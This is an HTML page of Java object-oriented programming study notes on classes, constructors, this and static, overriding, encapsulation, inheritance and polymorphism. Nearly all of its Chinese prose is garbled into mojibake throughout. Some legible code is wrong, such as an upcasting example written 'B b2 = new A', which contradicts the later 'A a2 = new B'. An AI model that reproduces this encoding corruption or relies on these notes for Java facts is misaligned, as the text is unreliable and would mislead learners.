<h1 id="ç±»å’Œå¯¹è±¡"><a href="#ç±»å’Œå¯¹è±¡" class="headerlink" title="ç±»å’Œå¯¹è±¡"></a>ç±»å’Œå¯¹è±¡</h1><p>ç±»ï¼šç±»ç°åœ¨ç°å®ä¸–ç•Œä¸­æ˜¯ä¸å­˜åœ¨çš„ä¸€ä¸ªæ¨¡æ¿ï¼Œæ˜¯ä¸€ä¸ªæ¦‚å¿µã€‚æ˜¯äººç±»å¤§è„‘æŠ½è±¡çš„ç»“æœ<br>ç±»ä»£è¡¨äº†ä¸€ç±»äº‹ç‰©<br>åœ¨ç°å®ä¸–ç•Œå½“ä¸­ï¼Œå¯¹è±¡Aä¸å¯¹è±¡Bä¹‹é—´å…·æœ‰çš„å…±åŒç‰¹å¾ï¼Œè¿›è¡ŒæŠ½è±¡æ€»ç»“å‡ºäº†ä¸€ä¸ªæ¨¡æ¿ã€‚è¿™ä¸ªæ¨¡æ¿è¢«ç§°ä¸ºç±»</p>
<p>å¯¹è±¡ï¼šå¯¹è±¡æ˜¯å®é™…å­˜åœ¨çš„ä¸ªä½“ï¼Œç°å®ä¸–ç•Œå½“ä¸­å®é™…å­˜åœ¨ã€‚</p>
<p><mark>ç±»â€“&gt;ã€å®ä¾‹åŒ–ã€‘â€“&gt;å¯¹è±¡â€“&gt;ã€æŠ½è±¡ã€‘â€“&gt;ç±»</mark></p>
<p><mark>æ³¨æ„<br>çŠ¶æ€å’ŒåŠ¨ä½œç‰¹å¾å½“å…·ä½“åˆ°æŸä¸€ä¸ªå¯¹è±¡åï¼Œå‘ç°æœ€ç»ˆç»“æœå¯èƒ½ä¸ä¸€æ ·ã€‚<br>å¯¹è±¡å’Œå¯¹è±¡ä¹‹é—´æœ‰å…±åŒçš„ç‰¹å¾ï¼Œä½†æ˜¯å…·ä½“åˆ°å¯¹è±¡ä»¥åæœ‰æ•°æ®å·®å¼‚</mark></p>
<p>ç±»çš„å®šä¹‰<br>[ä¿®é¥°ç¬¦åˆ—è¡¨]class ç±»å{<br>å±æ€§;<br>æ–¹æ³•;<br>}<br>å±æ€§é€šå¸¸é‡‡ç”¨ä¸€ä¸ªå˜é‡çš„å½¢å¼æ¥å®šä¹‰</p>
<p>JAVAè¯­è¨€ä¸­æ‰€æœ‰classéƒ½å±äºå¼•ç”¨æ•°æ®ç±»å‹<br>ç±»ä½“ &#x3D; å±æ€§ + æ–¹æ³•<br>å®ä¾‹å˜é‡ï¼šä¸èƒ½é€šè¿‡ç±»ç›´æ¥è®¿é—®<br>å¯¹è±¡åˆè¢«ç§°ä¸ºå®ä¾‹ï¼Œå®ä¾‹å˜é‡åˆè¢«ç§°ä¸ºå¯¹è±¡å˜é‡ï¼ˆå¯¹è±¡çº§åˆ«å˜é‡ï¼‰<br>å®ä¾‹åŒ–å¯¹è±¡çš„è¯­æ³•ï¼šnew ç±»åï¼ˆï¼‰<br>newè¿ç®—ç¬¦çš„ä½œç”¨æ˜¯åˆ›å»ºå¯¹è±¡ï¼Œåœ¨JVMå †å†…å­˜å½“ä¸­å¼€è¾Ÿæ–°å†…å­˜ç©ºé—´<br>å †å†…å­˜ï¼šnewçš„å¯¹è±¡åœ¨å †å†…å­˜ä¸­çš„å­˜å‚¨</p>
<p><img src="https://s3.ax1x.com/2021/01/25/sLtuFA.png"></p>
<p>åœ¨å¯¹è±¡ä¸­åˆ†è¾¹å®šä¹‰ä¸¤ä¸ªå¼•ç”¨ï¼Œåˆ†è¾¹æŒ‡å‘ä¸¤ä¸ªå¯¹è±¡ï¼Œåˆ™çŸ¥å…¶ä¹ŸçŸ¥å…¶äºŒ</p>
<p>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•ä½“ä¸­å£°æ˜<br>æˆå‘˜å˜é‡ï¼šæ–¹æ³•ä½“å¤–å£°æ˜<br>å®ä¾‹å˜é‡ï¼šå‰è¾¹ä¿®é¥°ç¬¦æ— static<br>é™æ€å˜é‡ï¼šå‰è¾¹ä¿®é¥°ç¬¦æœ‰sta</p>
<p>ä¸‰å—å†…å­˜å½“ä¸­å˜åŒ–æœ€é¢‘ç¹çš„æ˜¯æ ˆå†…å­˜ï¼Œæœ€å…ˆæœ‰æ•°æ®çš„æ˜¯æ–¹æ³•å»å†…å­˜ï¼Œåƒåœ¾å›æ”¶å™¨ä¸»è¦é’ˆå¯¹çš„æ˜¯å †å†…å­˜ã€‚</p>
<p>åƒåœ¾å›æ”¶å™¨ï¼ˆè‡ªåŠ¨å›æ”¶åƒåœ¾æœºåˆ¶ï¼ŒGCæœºåˆ¶ï¼‰<br>å½“å †å†…å­˜ä¸­çš„Javaå¯¹è±¡ç§°ä¸ºåƒåœ¾æ•°æ®æ—¶å€™ï¼Œä¼šè¢«åƒåœ¾å›æ”¶å™¨å›æ”¶ã€‚</p>
<p>å †å†…å­˜ä¸­çš„javaå¯¹è±¡å˜æˆåƒåœ¾çš„æ¡ä»¶<br>æ²¡æœ‰æ›´å¤šçš„å¼•ç”¨æŒ‡å‘å®ƒçš„æ—¶å€™<br>è¿™ä¸ªå¯¹è±¡æ— æ³•è¢«è®¿é—®ï¼Œå› ä¸ºè®¿é—®å¯¹è±¡åªèƒ½é€šè¿‡å¼•ç”¨æ–¹å¼è®¿é—®</p>
<p>é™æ€å˜é‡å­˜å‚¨åœ¨æ–¹æ³•åŒºå†…å­˜å½“ä¸­<br>ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªæ ˆå†…å­˜<br>æ ˆä¸­ä¸»è¦å­˜å‚¨æ–¹æ³•ä½“çš„å±€éƒ¨å˜é‡</p>
<h1 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h1><ol>
<li><p>æ„é€ æ–¹æ³•åˆè¢«ç§°ä¸ºæ„é€ å‡½æ•°&#x2F;æ„é€ å™¨</p>
</li>
<li><p>æ„é€ æ–¹æ³•è¯­å¥<br>[ä¿®é¥°ç¬¦åˆ—è¡¨]æ„é€ æ–¹æ³•åï¼ˆå½¢å¼å‚æ•°åˆ—è¡¨ï¼‰{<br>æ–¹æ³•ä½“ï¼›<br>}</p>
</li>
<li><p>å¯¹äºæ„é€ æ–¹æ³•æ¥è¯´ï¼Œâ€œè¿”å›ç±»å‹ä¸éœ€è¦æŒ‡å®šï¼Œå¹¶ä¸”ä¹Ÿä¸èƒ½å†™voidâ€ï¼Œå†™ä¸Šäº†å°±å˜æˆæ™®é€šæ–¹æ³•äº†</p>
</li>
<li><p>è°ƒç”¨ï¼šnew æ„é€ æ–¹æ³•åï¼ˆå®å‚åˆ—è¡¨ï¼‰<br>æ„é€ æ–¹æ³•çš„æ–¹æ³•åä¸ç±»åä¿æŒä¸€è‡´</p>
</li>
<li><p>æ„é€ æ–¹æ³•æœ‰è¿”å›å€¼ï¼Œå¹¶ä¸”è¿”å›å€¼ç±»å‹æ˜¯æ„é€ æ–¹æ³•æ‰€åœ¨ç±»çš„ç±»å‹</p>
</li>
<li><p>å½“ä¸€ä¸ªç±»ä¸­æ²¡æœ‰å®šä¹‰ä»»ä½•æ„é€ æ–¹æ³•çš„è¯ï¼Œç³»ç»Ÿé»˜è®¤ç»™è¯¥ç±»æä¾›ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œè¿™ä¸ªæ„é€ æ–¹æ³•è¢«ç§°ä¸ºç¼ºçœæ„é€ å™¨</p>
</li>
<li><p>æ„é€ æ–¹æ³•æ”¯æŒé‡è½½æœºåˆ¶</p>
</li>
<li><p>å½“ä¸€ä¸ªç±»ç°å®çš„æ„é€ æ–¹æ³•å®šä¹‰äº†å‡ºæ¥ï¼Œé‚£ä¹ˆç³»ç»Ÿä¸åœ¨ä¸ºè¿™ä¸ªç±»æä¾›ç¼ºçœæ„é€ å™¨ã€‚ï¼ï¼!å¼€å‘æ—¶æ‰‹åŠ¨ä¸ºå½“å‰ç±»æä¾›æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚å› ä¸ºæ— å‚æ„é€ æ–¹æ³•å¤ªå¸¸ç”¨äº†</p>
</li>
<li><p>å®ä¾‹å˜é‡æ²¡æœ‰æ‰‹åŠ¨èµ‹å€¼çš„æ—¶å€™ç³»ç»Ÿé»˜è®¤èµ‹å€¼ï¼Œç±»åŠ è½½äº†ä»£ç ç‰‡æ®µï¼Œè¿˜æ²¡æ¥çš„åŠåˆ›å»ºå¯¹è±¡ã€‚æ‰€æœ‰æ­¤æ—¶å®ä¾‹å˜é‡æ²¡æœ‰åˆå§‹åŒ–</p>
</li>
</ol>
<h1 id="å‚æ•°çš„ä¼ é€’"><a href="#å‚æ•°çš„ä¼ é€’" class="headerlink" title="å‚æ•°çš„ä¼ é€’"></a>å‚æ•°çš„ä¼ é€’</h1><p>å‚æ•°ä¼ é€’å®é™…ä¸Šä¼ é€’çš„æ˜¯å˜é‡ä¸­ä¿æŒçš„å…·ä½“å€¼ï¼ˆå­—é¢å€¼æˆ–è€…å†…å­˜åœ°å€ï¼‰</p>
<h1 id="thiså…³é”®å­—"><a href="#thiså…³é”®å­—" class="headerlink" title="thiså…³é”®å­—"></a>thiså…³é”®å­—</h1><ol>
<li>thisæ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œthisæ˜¯ä¸€ä¸ªå˜é‡ï¼Œthiså˜é‡ä¸­ä¿å­˜äº†å†…å­˜åœ°å€æŒ‡å‘äº†è‡ªèº«ï¼Œthiså­˜å‚¨åœ¨JVMå †å†…å­˜JAVAå¯¹è±¡å†…éƒ¨ã€‚</li>
<li>thisä»£è¡¨å½“å‰æ­£åœ¨æ‰§è¡Œè¿™ä¸ªè¡Œä¸ºçš„å¯¹è±¡ï¼Œå½“å¯¹è±¡C1æ—¶ï¼Œthisæ˜¯C1ï¼Œå½“å¯¹è±¡C2æ—¶thisæ˜¯C2</li>
<li>åˆ›å»º100ä¸ªjavaå¯¹è±¡ï¼Œå°±æœ‰100this</li>
<li>thiså¯ä»¥å‡ºç°åœ¨å®ä¾‹æ–¹æ³•å½“ä¸­ï¼ŒthisæŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œè¿™ä¸ªåŠ¨ä½œçš„å¯¹è±¡ï¼ˆthisä»£è¡¨å½“å‰å¯¹è±¡ï¼‰</li>
<li><mark>thiså¤šæ•°æƒ…å†µä¸‹éƒ½å¯ä»¥ä¸å†™</mark></li>
<li>thisä¸èƒ½å†tsaticä¸­ä½¿ç”¨</li>
</ol>
<p>åœ¨å¸¦siaticçš„æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è®¿é—®å®ä¾‹å˜é‡ï¼Œå®ä¾‹æ–¹æ³•ã€‚<br>å› ä¸ºå®ä¾‹å˜é‡å’Œå®ä¾‹æ–¹æ³•éƒ½éœ€è¦å˜é‡çš„å­˜åœ¨<br>è€Œsitaicæ–¹æ³•å½“ä¸­æ˜¯æ²¡æœ‰thisçš„ã€‚ä¹Ÿå°±æ˜¯è¯´å½“å‰å¯¹è±¡æ˜¯ä¸å­˜åœ¨çš„<br>è‡ªç„¶ä¹Ÿæ˜¯æ— æ³•è®¿é—®å½“å‰å¯¹è±¡çš„å®ä¾‹å˜é‡å’Œå®ä¾‹æ–¹æ³•</p>
<p><mark>â€œç±»å.â€å¯ä»¥çœç•¥</mark></p>
<ol>
<li><p>this.  â€“&gt;ä»€ä¹ˆæ—¶å€™ä¸èƒ½çœç•¥<br>ç”¨æ¥åŒºåˆ†å±€éƒ¨å˜é‡å’Œå®ä¾‹å˜é‡çš„æ—¶å€™ï¼Œâ€this.â€ä¸èƒ½çœç•¥</p>
</li>
<li><p>thiså¯ä»¥åœ¨é‚£é‡Œä½¿ç”¨<br>ä¸€ï¼Œå¯ä»¥ä½¿ç”¨åœ¨å®ä¾‹æ–¹æ³•å½“ä¸­ï¼Œä»£è¡¨å½“å‰å¯¹è±¡<br>äºŒï¼Œå¯ä»¥ä½¿ç”¨åœ¨æ„é€ æ–¹æ³•å½“ä¸­ï¼Œé€šè¿‡å½“å‰çš„æ„é€ æ–¹æ³•è°ƒç”¨å…¶ä»–çš„æ„é€ æ–¹æ³•ã€è¯­æ³•æ ¼å¼ï¼šthis(å®å‚)ã€‘</p>
</li>
</ol>
<p>åœ¨å°è£…çš„åœ°æ–¹â€this.â€å†åœ¨æ„é€ å‡½æ•°å¤„ä¸€æ¨¡ä¸€æ ·çš„â€this.â€â€”â€”å¹¶ä¸æ˜¯æ— æ„ä¹‰çš„ï¼Œå½“ä½ æƒ³ä¿®æ”¹å¯¹è±¡çš„å€¼çš„æ—¶å€™ã€‚</p>
<h1 id="staticå…³é”®å­—"><a href="#staticå…³é”®å­—" class="headerlink" title="staticå…³é”®å­—"></a>staticå…³é”®å­—</h1><p>ä»€ä¹ˆæ—¶å€™æˆå‘˜å˜é‡å£°æ˜ä¸ºå®ä¾‹å˜é‡<br>æ‰€ä»¥å¯¹è±¡éƒ½æœ‰è¿™ä¸ªå±æ€§ï¼Œä½†è¿™ä¸ªå±æ€§çš„å€¼ä¼šéšç€å¯¹è±¡çš„å˜åŒ–è€Œå˜åŒ–ã€ä¸åŒå¯¹è±¡çš„è¿™ä¸ªå€¼ä¸åŒã€‘</p>
<p>ä»€ä¹ˆæ—¶å€™æˆå‘˜å˜é‡å£°æ˜ä¸ºé™æ€å˜é‡<br>æ‰€ä»¥å¯¹è±¡éƒ½æœ‰è¿™ä¸ªå±æ€§ï¼Œå¹¶ä¸”æ‰€æœ‰å¯¹è±¡çš„è¿™ä¸ªå±æ€§çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œå»ºè®®å®šä¹‰ä¸ºé™æ€å˜é‡ï¼ŒèŠ‚çœå†…å­˜çš„å¼€é”€ã€‚</p>
<p><mark>é™æ€å˜é‡åœ¨ç±»åŠ è½½çš„æ—¶å€™åˆå§‹åŒ–ï¼Œå†…å­˜åœ¨æ–¹æ³•åŒºä¸­å¼€è¾Ÿã€‚è®¿é—®çš„æ—¶å€™ä¸éœ€è¦åˆ›å»ºå¯¹è±¡ï¼Œç›´æ¥ä½¿ç”¨â€ç±»å.é™æ€å˜é‡åâ€çš„æ–¹å¼è®¿é—®</mark></p>
<ol>
<li>å¯ä»¥ä½¿ç”¨staticå…³é”®å­—æ¥å®šä¹‰â€é™æ€ä»£ç å—â€ï¼š<br>è¯­æ³•è§„åˆ™ï¼š<br>static{<br>javaè¯­å¥;<br>}</li>
<li>é™æ€ä»£ç å—åœ¨ç±»åŠ è½½æ—¶æ‰§è¡Œï¼Œå¹¶ä¸”åªæ‰§è¡Œä¸€æ¬¡</li>
<li>é™æ€ä»£ç å—åœ¨ä¸€ä¸ªç±»ä¸­å¯ä»¥åŠ è½½å¤šä¸ªï¼Œå¹¶ä¸”éµå¾ªè‡ªä¸Šè€Œä¸‹çš„é¡ºåºä¾æ¬¡æ‰§è¡Œ</li>
<li>é™æ€ä»£ç å—çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ€ä¹ˆç”¨ï¼Ÿç”¨åœ¨é‚£å„¿ï¼Ÿä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ</li>
</ol>
<p>â€”è¿™å½“ç„¶å’Œå…·ä½“çš„éœ€è¦æœ‰å…³ï¼Œä¾‹å¦‚é¡¹ç›®ä¸­è¦æ±‚åœ¨ç±»åŠ è½½çš„æ—¶åˆ»&#x2F;æ—¶æœºæ‰§è¡Œä»£ç å®Œæˆæ—¥å¿—çš„è®°å½•ï¼Œé‚£ä¹ˆè¿™æ®µä»£ç æ—¥å¿—çš„ä»£ç å°±å¯ä»¥ç¼–å†™åˆ°é™æ€ä»£ç å—å½“ä¸­ï¼Œå®Œæˆæ—¥å¿—ã€‚</p>
<p>â€”é™æ€ä»£ç å—æ˜¯javaä¸ºç¨‹åºå‘˜å‡†å¤‡çš„ä¸€ä¸ªç‰¹æ®Šæ—¶åˆ»ï¼Œè¿™ä¸ªç‰¹æ®Šçš„æ—¶åˆ»è¢«ç§°ä¸ºç±»åŠ è½½æ—¶åˆ»ã€‚è‹¥å¸Œæœ›åœ¨æ­¤åˆ»æ‰§è¡Œä¸€æ®µç‰¹æ®Šçš„ç¨‹åºï¼Œè¿™æ®µç¨‹åºå¯ä»¥ç›´æ¥æ”¾åˆ°é™æ€ä»£ç å—å½“ä¸­</p>
<ol start="5">
<li>é€šå¸¸åœ¨é™æ€ä»£ç å—å½“ä¸­å®Œæˆé¢„å¤‡å·¥ä½œï¼Œå…ˆå®Œæˆæ•°æ®çš„å‡†å¤‡å·¥ä½œï¼Œä¾‹å¦‚ï¼šåˆå§‹åŒ–è¿æ¥æ± ï¼Œè§£æXMLé…ç½®æ–‡ä»¶</li>
</ol>
<h1 id="å®ä¾‹è¯­å¥å—"><a href="#å®ä¾‹è¯­å¥å—" class="headerlink" title="å®ä¾‹è¯­å¥å—"></a>å®ä¾‹è¯­å¥å—</h1><p>å®ä¾‹è¯­å¥å—&#x2F;ä»£ç å—</p>
<ol>
<li>å®ä¾‹ä»£ç å—å¯ä»¥ç¼–å†™å¤šä¸ªï¼Œä¹Ÿæ˜¯éµå¾ªè‡ªä¸Šè€Œä¸‹çš„é¡ºåºä¾æ¬¡æ‰§è¡Œã€‚</li>
<li>å®ä¾‹ä»£ç å—åœ¨æ„é€ æ–¹æ³•æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œæ„é€ æ–¹æ³•ä¸€æ¬¡æ‰§è¡Œï¼Œå®ä¾‹ä»£ç å—å¯¹äºæ‰§è¡Œä¸€æ¬¡ã€‚</li>
<li>å®ä¾‹ä»£ç å—ä¹Ÿæ˜¯javaè¯­è¨€ä¸ºç¨‹åºå‘˜å‡†å¤‡ä¸€ä¸ªç‰¹æ®Šçš„æ—¶æœºï¼Œè¿™ä¸ªç‰¹æ®Šæ—¶æœºè¢«ç§°ä¸ºï¼šå¯¹è±¡åˆå§‹åŒ–æ—¶æœº</li>
</ol>
<h1 id="æ–¹æ³•çš„è¦†ç›–"><a href="#æ–¹æ³•çš„è¦†ç›–" class="headerlink" title="æ–¹æ³•çš„è¦†ç›–"></a>æ–¹æ³•çš„è¦†ç›–</h1><ol>
<li>æ–¹æ³•è¦†ç›–åˆå«æ–¹æ³•çš„é‡å†™</li>
</ol>
<p>éœ€è¦ä½¿ç”¨çš„æƒ…å†µ<br>2. å½“çˆ¶ç±»ä¸­çš„æ–¹æ³•å·²ç»æ— æ³•æ»¡è¶³å½“å‰å­ç±»çš„éœ€æ±‚ï¼Œå­ç±»æœ‰å¿…è¦å°†çˆ¶ç±»ä¸­ç»§æ‰¿è¿‡æ¥çš„æ–¹æ³•è¿›è¡Œé‡æ–°ç¼–å†™ï¼Œè¿™ä¸ªé‡æ–°ç¼–å†™çš„è¿‡ç¨‹ç§°ä¸ºæ–¹æ³•é‡å†™&#x2F;æ–¹æ³•è¦†ç›–ã€‚</p>
<p>ä»£ç æ»¡è¶³çš„æ—¶å€™å‘ç”Ÿä»£ç é‡å†™<br>3. ä¸€ï¼Œæ–¹æ³•é‡å†™å‘ç”Ÿåœ¨å…·æœ‰ç»§æ‰¿å…³ç³»çš„çˆ¶å­ç±»ä¹‹é—´<br>äºŒï¼Œè¿”å›å€¼ç±»å‹ç›¸åŒï¼Œæ–¹æ³•åç›¸åŒï¼Œå½¢å‚åˆ—è¡¨ç›¸åŒ</p>
<ol start="4">
<li><p>æ–¹æ³•é‡æ–°çš„æ—¶å€™ç”¨å¤åˆ¶ç²˜è´´</p>
</li>
<li><p>è®¿é—®æƒé™ä¸èƒ½ä½ï¼Œå¯ä»¥æ›´é«˜</p>
</li>
<li><p>æŠ›å‡ºçš„å¼‚å¸¸ä¸èƒ½æ›´å¤šå¯ä»¥æ›´å°‘ã€‚</p>
</li>
<li><p>æ³¨æ„<br>ç§æœ‰æ–¹æ³•ä¸èƒ½ç»§æ‰¿ï¼Œæ‰€ä»¥ä¸èƒ½è¦†ç›–ã€‚<br>æ„é€ æ–¹æ³•ä¸èƒ½ç»§æ‰¿ï¼Œæ‰€ä»¥ä¸èƒ½è¦†ç›–ã€‚<br>é™æ€æ–¹æ³•ä¸èƒ½ç»§æ‰¿ï¼Œæ‰€ä»¥ä¸èƒ½è¦†ç›–ã€‚<br>è¦†ç›–åªé’ˆå¯¹æ–¹æ³•ï¼Œä¸è°ˆå±æ€§ã€‚</p>
</li>
</ol>
<h1 id="javaè¯­è¨€çš„ä¸‰å¤§ç‰¹å¾"><a href="#javaè¯­è¨€çš„ä¸‰å¤§ç‰¹å¾" class="headerlink" title="javaè¯­è¨€çš„ä¸‰å¤§ç‰¹å¾"></a>javaè¯­è¨€çš„ä¸‰å¤§ç‰¹å¾</h1><h2 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h2><p>å°è£…çš„å¥½å¤„ï¼š<br>1ï¼Œå°è£…ä¹‹åï¼Œå¯¹äºé‚£ä¸ªå®ç‰©æ¥è¯´ï¼Œçœ‹ä¸åˆ°è¿™ä¸ªäº‹ç‰©å¤æ‚çš„ä¸€é¢ï¼Œåªèƒ½çœ‹åˆ°äº‹ç‰©ç®€å•çš„ä¸€é¢ï¼Œå¤æ‚æ€§å°è£…ï¼Œå¯¹å¤–æä¾›ç®€å•çš„æ“ä½œå…¥å£<br>2ï¼Œå°è£…ä¹‹åå½¢æˆçœŸæ­£çš„å¯¹è±¡ï¼ŒçœŸæ­£çš„ç‹¬ç«‹ä½“<br>3ï¼Œå°è£…æ„å‘³ç€ä»¥åçš„ç¨‹åºå¯ä»¥é‡å¤ä½¿ç”¨ã€‚å¹¶ä¸”è¿™ä¸ªæ˜¯æˆ‘åº”è¯¥é€‚åº”æ€§æ¯”è¾ƒå¼ºã€‚åœ¨ä»»ä½•åœºåˆéƒ½å¯ä»¥ä½¿ç”¨<br>4å°è£…ä»¥åï¼Œå¯¹äºäº‹ç‰©æœ¬èº«æé«˜äº†å®‰å…¨çº§åˆ«</p>
<p>å°è£…çš„æ­¥éª¤ï¼š<br>1ï¼Œå¯¹æ‰€æœ‰å±æ€§ç§æœ‰åŒ–ï¼Œä½¿ç”¨privateä¿®é¥°è¯<br>2ï¼Œå¯¹å¤–æä¾›ç®€å•è®¿é—®å…¥å£<br>getâ€“&gt;è¾“å‡º<br>Setâ€“&gt;ä¿®æ”¹</p>
<p><mark>&#x2F;ï¼Œsettre ä¸ getteræ–¹æ³•æ²¡æœ‰staticå…³é”®å­—<br>æœ‰staticå…³é”®å­—ä¿®é¥°çš„æ–¹æ³•è°ƒç”¨ï¼šç±»åï¼Œæ–¹æ³•åï¼ˆå®å‚ï¼‰<br>æ— staticå…³é”®å­—ä¿®é¥°çš„æ–¹æ³•è°ƒç”¨ï¼šå¼•ç”¨ï¼Œæ–¹æ³•åï¼ˆå®å‚ï¼‰</mark></p>
<p>IDEAä¸­ç›´æ¥ä¸€é”®å°è£…</p>
<h2 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h2><p>Javaè¯­è¨€ä¸­çš„ç»§æ‰¿</p>
<ol>
<li>ç»§æ‰¿æ˜¯é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹å¾ä¹‹ä¸€</li>
<li>ç»§æ‰¿â€åŸºæœ¬â€çš„ä½œç”¨æ˜¯ï¼šä»£ç å¤ç”¨ã€‚ä½†æ˜¯ç»§æ‰¿æœ€â€é‡è¦â€çš„æ˜¯ï¼šæœ‰äº†ç»§æ‰¿æ‰æœ‰äº†ä»¥åï¼Œæ–¹æ³•çš„è¦†ç›–å’Œå¤šæ€æœºåˆ¶</li>
<li>javaè¯­è¨€ä¸­ç»§æ‰¿åªæ”¯æŒå•ç»§æ‰¿ï¼Œä¸€ä¸ªç±»ä¸èƒ½åŒæ—¶ç»§æ‰¿å¾ˆå¤šç±»ï¼Œåªèƒ½ç»§æ‰¿ä¸€ä¸ªç±»ï¼Œåœ¨C++æ”¯æŒå¤šç»§æ‰¿</li>
<li>å…³äºç»§æ‰¿ä¸­çš„ä¸€äº›æœ¯è¯­<br>Bç±»ç»§æ‰¿Aç±»ï¼Œå…¶ä¸­ï¼š<br>Aç±»ç§°ä¸ºï¼šçˆ¶ç±»ï¼ŒåŸºç±»ï¼Œè¶…ç±»ï¼Œsuperclass<br>Bç±»ç§°ä¸ºï¼šå­ç±»ï¼Œæ´¾ç”Ÿç±»ï¼Œsubclass</li>
<li>åœ¨javaè¯­è¨€å½“ä¸­å­ç±»ç»§æ‰¿çˆ¶ç±»éƒ½ç»§æ‰¿é‚£äº›æ•°æ®å‘¢ï¼Ÿ<br>â€”ç§æœ‰çš„ä¸æ”¯æŒç»§æ‰¿<br>â€”æ„é€ æ–¹æ³•ä¸æ”¯æŒç»§æ‰¿<br>â€”å…¶ä»–æ•°æ®éƒ½å¯ä»¥è¢«ç»§æ‰¿</li>
<li>è™½ç„¶javaè¯­è¨€å½“ä¸­åªæ”¯æŒå•ç»§æ‰¿ä½†æ˜¯ä¸€ä¸ªç±»ä¹Ÿå¯ä»¥é—´æ¥ç»§æ‰¿å…¶ä»–ç±»ï¼Œä¾‹å¦‚ï¼š<br>C extends b{<br>}<br>B extends  A{<br>}<br>A extends T{<br>}<br>Cç±»é—´ç›´ç»§æ‰¿Bç±»ï¼Œä½†æ˜¯Cç±»é—´æ¥ç»§æ‰¿TAç±»</li>
<li>javaè¯­è¨€ä¸­å‡è®¾ä¸€ä¸ªç±»æ²¡æœ‰æ˜¾ç¤ºçš„ä»»ä½•ç»§æ‰¿ç±»ï¼Œè¯¥ç±»é»˜è®¤ç»§æ‰¿javaSEåº“å½“ä¸­æä¾›çš„java.lang.Objectç±»</li>
</ol>
<p>å­ç±»ç»§æ‰¿çˆ¶ç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®private</p>
<h2 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h2><p>javaè¯­è¨€ä¸­çš„å¤šæ€è¯­æ³•æœºåˆ¶<br>1.ABCä¸‰ä¸ªç±»ä¹‹é—´çš„å…³ç³»ï¼š<br>Bç±»ç»§æ‰¿Aç±»<br>Cç±»ç»§æ‰¿Aç±»<br>Bï¼ŒCä¹‹é—´æ²¡æœ‰ä»»ä½•ç»§æ‰¿å…³ç³»</p>
<p>2.å…³äºå¤šæ€ä¸­æ¶‰åŠåˆ°çš„å‡ ä¸ªæ¦‚å¿µ</p>
<p>å‘ä¸Šè½¬å‹ï¼ˆupcastingï¼‰                             B b2 &#x3D; new A<br>å­ç±»å‹ â€“&gt;çˆ¶ç±»å‹<br>åˆè¢«ç§°ä¸ºï¼šè‡ªåŠ¨ç±»å‹è½¬æ¢</p>
<p>å‘ä¸‹è½¬å‹ï¼ˆdowncastingï¼‰<br>çˆ¶ç±»å‹â€“&gt;å­ç±»å‹<br>åˆè¢«ç§°ä¸ºï¼šå¼ºåˆ¶ç±»å‹è½¬æ¢ã€éœ€è¦åŠ å¼ºåˆ¶ç±»å‹è½¬æ¢ç¬¦ã€‘</p>
<p><mark>æ— è®ºæ˜¯å‘ä¸Šè½¬å‹è¿˜æ˜¯å‘ä¸‹è½¬å‹ï¼Œä¸¤ç§ç±»å‹ä¹‹é—´å¿…é¡»è¦ç”¨ç»§æ‰¿å…³ç³»ã€‚<br>æ²¡æœ‰ç»§æ‰¿å…³ç³»ï¼Œç¨‹åºæ˜¯æ— æ³•ç¼–è¯‘é€šè¿‡çš„</mark></p>
<ol>
<li>Javaç¨‹åºæ°¸è¿œéƒ½åˆ†ä¸ºç¼–è¯‘é˜¶æ®µå’Œè¿è¡Œé˜¶æ®µ</li>
<li>å…ˆåˆ†æç¼–è¯‘é˜¶æ®µï¼Œåœ¨åˆ†æè¿è¡Œé˜¶æ®µï¼Œç¼–è¯‘æ— æ³•é€šè¿‡ï¼Œæ ¹æœ¬æ˜¯æ— æ³•è¿è¡Œçš„Aã€‚class</li>
</ol>
<p>A a2 &#x3D; new B</p>
<p>é™æ€ç»‘å®šï¼Œç¼–è¯‘è¿‡ç¨‹ä¸­ç»‘å®šï¼Œé™æ€ç»‘å®šä¹‹åæ‰æœ‰åç»­è¿è¡Œ</p>
<ol start="3">
<li>åœ¨ç¨‹åºè¿è¡Œé˜¶æ®µï¼ŒJVMå †å†…å­˜ä¸­çœŸå®ç»‘å®šçš„æ˜¯Bå¯¹è±¡ï¼Œé‚£ä¹ˆä»¥ä¸‹ç¨‹åºåœ¨è¿è¡Œé˜¶æ®µä¸€å®šä¼šè°ƒç”¨Bå¯¹è±¡çš„æ–¹æ³•ï¼Œæ­¤æ—¶å‘ç”Ÿäº†åŠ¨æ€ç»‘å®šï¼Œè¿è¡Œé˜¶æ®µç»‘å®šã€‚</li>
</ol>
<p><mark>åº•å±‚æ˜¯ä»€ä¹ˆå¯¹è±¡å°±è°ƒå¯¹è±¡çš„ä»€ä¹ˆæ–¹æ³•</mark></p>
<ol start="4">
<li>çˆ¶ç±»å‹å¼•ç”¨æŒ‡å‘å­ç±»å‹å¯¹è±¡è¿™ç§æœºåˆ¶å¯¼è‡´ç¨‹åºå­˜åœ¨ç¼–è¯‘é˜¶æ®µç»‘å®šå’Œè¿è¡Œé˜¶æ®µç»‘å®šä¸¤ç§ä¸åŒçš„å½¢æ€&#x2F;çŠ¶æ€ï¼Œè¿™ç§æœºåˆ¶å¯ä»¥æˆä¸ºä¸€ç§å¤šæ€è¯­æ³•æœºåˆ¶</li>
</ol>
